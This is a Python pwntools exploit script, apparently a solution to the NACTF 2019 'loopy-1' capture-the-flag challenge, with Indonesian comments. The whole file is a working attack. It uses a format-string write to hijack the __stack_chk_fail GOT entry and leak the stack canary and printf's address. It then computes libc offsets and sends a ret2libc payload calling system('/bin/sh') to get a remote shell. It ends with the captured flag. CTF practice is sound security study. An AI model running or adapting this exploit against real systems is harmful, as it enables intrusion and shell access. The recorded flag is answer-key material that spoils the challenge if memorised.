from pwn import *
from fmtstr import FormatString
context.terminal = 'xfce4-terminal'
elf = ELF('./loopy-1')
# p = process('./loopy-1')
p = remote('shell.2019.nactf.com', 31732)
offset = 7
offset_canary = 23 # buffer di ebp-0x4c, canary di 0xc, jaraknya = 16

stack_chk_fail_got = elf.got['__stack_chk_fail']
print stack_chk_fail_got
vuln_addr = elf.sym['vuln']
# gdb.attach(p)

payload  = p32(stack_chk_fail_got)+'.%24$p'
print repr(p32(vuln_addr+111)[:2])
remain = 0x9211 - len(payload)
l = remain - len(str(remain)) - len('%x%7$hn')+7
# len('%x%7$hn') kayaknya gausah karna di gdb malah kelebihan 7 karakter
payload += '%{}x%7$hn'.format(l)
print len(payload), l, hex(l+len(payload)), l+len(payload)
print 'payload =',repr(payload)
print len(payload)
rop = 'A'*(0x4c-len(payload)) + 'AAAA' + p32(elf.plt['printf']) + p32(elf.sym['vuln']) + p32(elf.got['printf'])
p.sendline(payload+rop)

print p.recvuntil('.')
canary = int(p.recv(10),16)
print hex(canary)
# pause()
p.recvuntil(p32(elf.got['printf']))
printf_addr = u32(p.recv(4))

# offset___libc_start_main_ret = 0x1ab41
# offset_system = 0x0003ec00
# offset_dup2 = 0x000e92f0
# offset_read = 0x000e86b0
# offset_write = 0x000e8750
# offset_str_bin_sh = 0x17eaaa
# offset_printf = 0x00052cb0

offset___libc_start_main_ret = 0x1ab41
offset_system = 0x0003ec00
offset_dup2 = 0x000e92f0
offset_read = 0x000e86b0
offset_write = 0x000e8750
offset_str_bin_sh = 0x17eaaa
offset_printf = 0x00052cb0

libc_base = printf_addr - offset_printf
system_addr = libc_base + offset_system
binsh_addr = libc_base + offset_str_bin_sh

payload = 'A'*0x4c+'AAAA'+p32(system_addr)+'DEAD'+p32(binsh_addr)
p.sendline(payload)

p.interactive()

# flag = nactf{lo0p_4r0und_th3_G0T_VASfJ4VJ}
